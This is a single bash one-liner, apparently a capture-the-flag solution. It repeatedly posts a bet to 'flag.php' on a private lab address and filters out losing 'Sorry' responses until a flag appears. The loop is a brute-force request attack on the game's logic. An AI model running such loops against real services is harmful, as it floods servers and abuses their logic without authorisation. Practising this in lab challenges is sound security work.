while [ 1 ]; do curl -s 'http://172.17.0.4/flag.php' --data 'bet=1' | grep -v Sorry; done

